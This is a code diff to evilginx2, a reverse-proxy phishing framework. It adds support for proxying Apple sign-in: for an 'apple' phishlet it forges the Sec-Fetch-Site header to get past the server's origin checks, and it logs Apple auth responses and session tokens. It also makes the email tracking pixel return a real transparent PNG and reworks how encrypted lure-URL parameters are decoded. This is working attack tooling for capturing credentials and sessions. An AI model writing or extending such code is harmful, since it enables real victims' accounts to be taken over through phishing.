@@ -11,7 +11,6 @@ import (
 	"bufio"
 	"bytes"
 	cryptorand "crypto/rand"
-	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
@@ -47,6 +46,7 @@ import (
 	"github.com/kgretzky/evilginx2/core/antibot/signals"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/gophish/evilginx"
 	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 )
 
@@ -848,7 +848,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// Google's server validates this and rejects non-same-origin sign-in requests.
 				sec_fetch_site := req.Header.Get("Sec-Fetch-Site")
 				if sec_fetch_site == "cross-site" || sec_fetch_site == "same-site" {
-					req.Header.Set("Sec-Fetch-Site", "same-origin")
+					if pl != nil && pl.Name == "apple" {
+						req.Header.Set("Sec-Fetch-Site", "same-site")
+					} else {
+						req.Header.Set("Sec-Fetch-Site", "same-origin")
+					}
 				}
 
 				// fix referer
@@ -1538,6 +1542,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			if pl != nil && pl.Name == "apple" {
+				if strings.HasPrefix(resp.Request.URL.Path, "/appleauth/") || strings.HasPrefix(resp.Request.Host, "auth.") {
+					log.Important("[Apple Auth] Response: Status %d | scnt: %s | URL: %s",
+						resp.StatusCode, resp.Header.Get("scnt"), resp.Request.URL.String())
+					if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
+						body_bytes, _ := io.ReadAll(resp.Body)
+						log.Important("[Apple Auth] Error Body: %s", string(body_bytes))
+						resp.Body = io.NopCloser(bytes.NewBuffer(body_bytes))
+					}
+				}
+			}
+
 			return resp
 		})
 
@@ -1591,7 +1607,14 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
-	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	transparentPng := []byte{
+		0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
+		0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
+		0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0x60, 0x00, 0x02, 0x00,
+		0x00, 0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
+		0xAE, 0x42, 0x60, 0x82,
+	}
+	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, string(transparentPng))
 	if resp != nil {
 		return req, resp
 	}
@@ -1692,78 +1715,24 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 	var ret bool = false
 	vals := u.Query()
 
-	var enc_key string
+	for k, v := range vals {
+		// 1. Always add the parameter as is (plain)
+		if len(v) > 0 {
+			session.Params[k] = v[0]
+		}
 
-	for _, v := range vals {
-		if len(v[0]) > 8 {
-			enc_key = v[0][:8]
-			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
-			if err == nil && len(enc_vals) > 0 {
-				dec_params := make([]byte, len(enc_vals)-1)
-
-				var crc byte = enc_vals[0]
-				c, _ := rc4.NewCipher([]byte(enc_key))
-				c.XORKeyStream(dec_params, enc_vals[1:])
-
-				var crc_chk byte
-				for _, c := range dec_params {
-					crc_chk += byte(c)
-				}
-
-				if crc == crc_chk {
-					params, err := url.ParseQuery(string(dec_params))
-					if err == nil {
-						for kk, vv := range params {
-							log.Debug("param: %s='%s'", kk, vv[0])
-
-							session.Params[kk] = vv[0]
-						}
-						ret = true
-						break
-					}
-				} else {
-					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
-				}
-			} else {
-				log.Debug("extractParams: %s", err)
+		// 2. Try to decrypt as an encrypted parameter
+		// We don't have the campaign-specific encryption key yet,
+		// so we pass an empty string for now (defaults to RC4).
+		params, ok, err := evilginx.ExtractPhishUrlParams(v[0], "")
+		if err == nil && ok {
+			for kk, vv := range params {
+				log.Debug("extracted param: %s='%s'", kk, vv)
+				session.Params[kk] = vv
 			}
+			ret = true
 		}
 	}
-	/*
-		for k, v := range vals {
-			if len(k) == 2 {
-				// possible rc4 encryption key
-				if len(v[0]) == 8 {
-					enc_key = v[0]
-					break
-				}
-			}
-		}
-
-		if len(enc_key) > 0 {
-			for k, v := range vals {
-				if len(k) == 3 {
-					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					if err == nil {
-						dec_params := make([]byte, len(enc_vals))
-
-						c, _ := rc4.NewCipher([]byte(enc_key))
-						c.XORKeyStream(dec_params, enc_vals)
-
-						params, err := url.ParseQuery(string(dec_params))
-						if err == nil {
-							for kk, vv := range params {
-								log.Debug("param: %s='%s'", kk, vv[0])
-
-								session.Params[kk] = vv[0]
-							}
-							ret = true
-							break
-						}
-					}
-				}
-			}
-		}*/
 	return ret
 }
 
